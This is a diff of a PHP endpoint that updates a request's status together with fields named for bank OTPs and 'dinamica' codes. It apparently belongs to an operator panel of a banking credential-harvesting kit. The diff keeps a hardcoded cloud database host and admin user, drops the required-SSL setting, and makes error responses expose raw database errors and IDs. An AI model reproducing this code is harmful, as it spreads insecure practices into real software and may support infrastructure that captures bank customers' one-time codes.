@@ -1,7 +1,7 @@
 <?php
 header('Content-Type: application/json');
 
-// Leer credenciales de Render
+// Leer credenciales de variables de Render (Environment Variables)
 $db_host = getenv('DB_HOST') ?: 'mysql-86c4508-javiercarva913-1fe5.a.aivencloud.com';
 $db_port = getenv('DB_PORT') ?: 26767;
 $db_user = getenv('DB_USER') ?: 'avnadmin';
@@ -26,8 +26,6 @@ if ($mysqli->connect_error) {
   exit;
 }
 
-$mysqli->query("SET SESSION ssl_mode='REQUIRED'");
-
 // Obtener datos
 $id = $_POST['id'] ?? '';
 $new_status = $_POST['status'] ?? '';
@@ -39,7 +37,7 @@ if (!$id || !$new_status) {
   http_response_code(400);
   echo json_encode([
     'status' => 'ERROR',
-    'message' => 'ID y status requeridos'
+    'message' => 'ID y status son requeridos'
   ]);
   exit;
 }
@@ -53,23 +51,23 @@ try {
   );
 
   if (!$stmt) {
-    throw new Exception('Error en prepare');
+    throw new Exception('Error en prepare: ' . $mysqli->error);
   }
 
   $stmt->bind_param('sssi', $new_status, $banco_otp, $dinamica, $id);
 
   if (!$stmt->execute()) {
-    throw new Exception('Error en execute');
+    throw new Exception('Error en execute: ' . $stmt->error);
   }
 
   if ($stmt->affected_rows === 0) {
-    throw new Exception('Solicitud no encontrada');
+    throw new Exception('No se encontró la solicitud con ID: ' . $id);
   }
 
   http_response_code(200);
   echo json_encode([
     'status' => 'OK',
-    'message' => 'Estado actualizado',
+    'message' => 'Estado actualizado en m3it3m',
     'id' => $id,
     'new_status' => $new_status
   ]);
